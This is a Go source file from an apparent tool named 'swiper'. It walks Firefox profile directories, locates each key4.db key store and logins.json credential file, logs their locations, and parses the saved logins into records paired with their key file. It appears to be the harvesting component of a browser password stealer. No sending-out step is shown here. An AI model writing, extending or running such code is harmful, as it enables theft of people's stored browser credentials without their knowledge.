package finder

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"swiper/models"
)

type finder struct {
	path string
}

func New(path string) *finder {
	return &finder{path: path}
}

func (f *finder) FindKeys() ([]models.Auth, error) {
	path, err := f.getDir()
	if err != nil {
		return nil, err
	}
	return f.collectData(path)
}

func (f *finder) getDir() (map[string]string, error) {
	dir, err := ioutil.ReadDir(f.path)
	if err != nil {
		return nil, err
	}

	ret := map[string]string{}

	for _, v := range dir {
		key, login, err := f.searchFiles(fmt.Sprintf(`%s\%s`, f.path, v.Name()))
		if err != nil {
			return nil, err
		}
		if key != "" {
			ret[key] = login
		}
	}
	return ret, nil
}

func (f *finder) collectData(paths map[string]string) ([]models.Auth, error) {
	ret := make([]models.Auth, 0, 10)
	for k, v := range paths {
		data, err := ioutil.ReadFile(v)
		if err != nil {
			return nil, err
		}
		tmp := models.FirefoxLogin{}
		if err := json.Unmarshal(data, &tmp); err != nil {
			return nil, err
		}
		for _, elem := range tmp.Logins {
			ret = append(ret, models.Auth{
				Key:   k,
				Login: elem,
			})
		}
	}
	return ret, nil
}

//returns key4.db and logins.json file for each directory
func (f *finder) searchFiles(path string) (string, string, error) {
	var key, login string
	k := regexp.MustCompile(`.*\\key4\.db`)
	l := regexp.MustCompile(`.*\\logins\.json`)
	if err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if k.MatchString(path) {
			log.Println(fmt.Sprintf(`File with keys found at "%s"`, path))
			key = path
		}
		if l.MatchString(path) {
			log.Println(fmt.Sprintf(`File with creds found at "%s"`, path))
			login = path
		}
		return nil
	}); err != nil {
		return "", "", err
	}
	return key, login, nil
}
